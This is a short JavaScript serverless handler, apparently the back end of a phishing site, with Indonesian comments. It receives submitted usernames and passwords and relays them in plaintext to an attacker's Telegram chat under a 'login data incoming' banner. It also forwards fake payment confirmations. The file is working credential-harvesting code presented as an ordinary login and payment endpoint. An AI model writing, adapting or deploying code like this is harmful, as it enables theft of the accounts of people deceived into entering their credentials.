export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { type, username, password, product, price } = req.body;
  
  // Ambil token dan chat ID secara aman dari Environment Variables Vercel
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  if (!botToken || !chatId) {
    return res.status(500).json({ error: 'Telegram configuration missing on server' });
  }

  let message = "";

  if (type === 'LOGIN') {
    message = `🚨 **XZACKOCULUS - DATA LOGIN MASUK!** 🚨\n\n👤 Username: ${username}\n🔑 Password: ${password}\n🌐 Waktu: ${new Date().toLocaleString()}`;
  } else if (type === 'PAYMENT') {
    message = `✅ **PEMBAYARAN DIKONFIRMASI!** ✅\n\n📦 Produk: ${product}\n💰 Nominal: Rp ${price}\n⚡ Status: LUNAS / MENUNGGU ADMIN\n🌐 Waktu: ${new Date().toLocaleString()}`;
  } else {
    return res.status(400).json({ error: 'Invalid type' });
  }

  const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

  try {
    const response = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    const data = await response.json();
    return res.status(200).json({ success: true, data });
  } catch (error) {
    return res.status(500).json({ success: false, error: error.message });
  }
}
